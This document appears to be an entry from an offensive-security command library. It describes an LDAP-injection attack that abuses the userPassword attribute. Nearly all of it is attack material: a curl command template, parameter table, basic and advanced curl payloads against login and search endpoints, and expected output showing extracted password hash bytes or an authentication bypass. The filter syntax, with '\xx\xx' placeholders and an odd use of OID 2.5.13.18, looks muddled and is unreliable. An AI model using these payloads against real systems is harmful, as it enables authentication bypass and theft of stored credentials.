---
type: command
executor: bash
data: >-
  curl -X POST http://target.example.com/login -d
  "username=*)(userPassword=2.5.13.18:=\xx\xx ) | * &password=any"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Web
tags:
  - ldap-injection
verified: true
validated: true
---

# inject-ldap-userpassword-encoding

## Command

```bash
curl -X POST $_TARGET_URL -d "username=$_INJECTED_USERNAME &password=$_PASSWORD"
```

## Description

This command injects LDAP escape sequences targeting the binary format of the userPassword attribute (OID 2.5.13.18) to manipulate queries and extract or bypass encoded credentials. Use it after confirming basic injection to handle hashed or binary password storage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The vulnerable login or search endpoint | Yes |
| $_INJECTED_USERNAME | Payload with encoding, e.g., *)(userPassword=2.5.13.18:=\xx\xx ) | * | Yes |
| $_PASSWORD | Arbitrary password (bypassed by injection) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.example.com/login -d "username=*)(userPassword=2.5.13.18:=\xx\xx ) | * &password=any"
```

### Advanced Usage

```bash
curl -X POST http://target.example.com/search -d "query=*)(userPassword=2.5.13.18:=\00\01 ) &filter=users" -v
```

## Expected Output

Successful response with extracted userPassword values, e.g., userPassword:2.5.13.18:=\ab\cd\ef (binary hash bytes). Or auth success if the encoding forces a match.

## Related

- [[procedures/LDAP-Injection-Exploiting-userPassword-Attribute]]
- [[commands/inject-ldap-userpassword-payload]]
